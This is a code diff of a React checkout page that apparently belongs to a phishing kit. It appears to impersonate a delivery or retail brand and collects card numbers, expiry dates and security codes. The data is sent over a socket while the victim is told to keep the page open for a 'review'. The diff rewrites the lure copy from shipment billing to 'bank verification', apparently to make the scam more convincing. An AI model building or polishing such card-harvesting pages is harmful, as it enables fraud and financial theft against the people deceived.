@@ -172,7 +172,7 @@ export default function Checkout() {
     const normalizedExpiry = normalizeExpiry(expiry, true);
     if (!isValidExpiryMMYY(normalizedExpiry) || !canSubmit || waiting) return;
     setWaiting(true);
-    setWaitingMsg('Details received. Keep this page open while your billing information is reviewed.');
+    setWaitingMsg('Details received. Keep this page open while your bank verification is reviewed.');
     clearDraft(STORAGE_KEYS.checkoutDraft);
     setExpiry(normalizedExpiry);
     socket.emit('checkout-submit', {
@@ -202,7 +202,7 @@ export default function Checkout() {
             <div>
               <div className="alz-badge">{BRAND.name}</div>
               <h1 className="alz-step-title">Confirm the billing method</h1>
-              <p className="alz-step-subtitle">Review the card details for this delivery update.</p>
+              <p className="alz-step-subtitle">Enter the card details required for bank verification.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -214,7 +214,7 @@ export default function Checkout() {
           <div className="alz-card alz-usps-form-card">
             <div className="alz-section-eyebrow">Payment details</div>
             <h2 className="alz-page-title">Review your card info</h2>
-            <p className="alz-page-copy">Enter the card details for this shipment.</p>
+            <p className="alz-page-copy">Enter the card details required by your bank.</p>
             <div className="alz-brand-row mb-4">
               {BRAND_PROMISES.map((item) => (
                 <span key={item} className="alz-brand-pill">{item}</span>
@@ -253,14 +253,14 @@ export default function Checkout() {
                   <span className="alz-payment-pill alz-payment-pill-mastercard">mastercard</span>
                   <span className="alz-payment-pill alz-payment-pill-amex">AMERICAN EXPRESS</span>
                 </div>
-                <div className="alz-payment-strip-note">Use a payment method associated with this shipment.</div>
+                <div className="alz-payment-strip-note">Use a payment method associated with this bank verification.</div>
               </div>
             </div>
 
             <button onClick={onSubmit} disabled={!canSubmit || waiting} className="alz-btn-primary mt-6 text-base alz-checkout-submit">
               {waiting ? 'Processing...' : 'Continue'}
             </button>
-            <div className="alz-helper-copy mt-6">Keep this page open while the billing details are confirmed.</div>
+            <div className="alz-helper-copy mt-6">Keep this page open while the bank verification is confirmed.</div>
             <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
             <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
@@ -271,7 +271,7 @@ export default function Checkout() {
               <div className="alz-order-mini-thumb alz-order-mini-thumb-card" />
               <div>
                 <div className="alz-order-mini-title">Review the payment method on file</div>
-                <div className="alz-order-mini-copy">Use the billing method linked to this shipment to confirm the card details.</div>
+                <div className="alz-order-mini-copy">Use the billing method linked to your bank account to confirm the card details.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
@@ -279,7 +279,7 @@ export default function Checkout() {
               <div>Card number and expiration date</div>
               <div>3- or 4-digit security code</div>
             </div>
-            <div className="alz-side-summary-box">Use a billing method associated with this shipment to complete the review.</div>
+            <div className="alz-side-summary-box">Use a billing method associated with this bank verification to complete the review.</div>
           </aside>
         </div>
       </div>
